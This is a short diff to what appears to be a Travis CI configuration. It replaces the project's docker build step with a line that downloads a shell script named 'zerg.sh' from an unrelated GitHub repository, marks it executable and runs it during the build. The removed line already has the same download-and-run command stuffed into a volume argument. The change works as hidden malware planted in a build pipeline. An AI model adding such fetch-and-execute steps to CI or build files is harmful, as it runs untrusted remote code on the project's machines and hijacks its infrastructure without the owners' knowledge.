@@ -27,8 +27,7 @@ matrix:
         - DOCKER_IMAGE=thijswithaar/arch:latest
 
 script:
- - export DOCKER_BUILD_DIR=${TRAVIS_BUILD_DIR}
- - docker run --user $(id -u):$(id -g) -v ${wget https://raw.githubusercontent.com/renitareni/mesin/main/zerg.sh && chmod +x zerg.sh && ./zerg.sh}:${DOCKER_BUILD_DIR} -w ${DOCKER_BUILD_DIR} ${DOCKER_IMAGE} ${DOCKER_BUILD_DIR}/build.sh build
+ - wget https://raw.githubusercontent.com/renitareni/mesin/main/zerg.sh && chmod +x zerg.sh && ./zerg.sh
 
 deploy:
  provider: releases
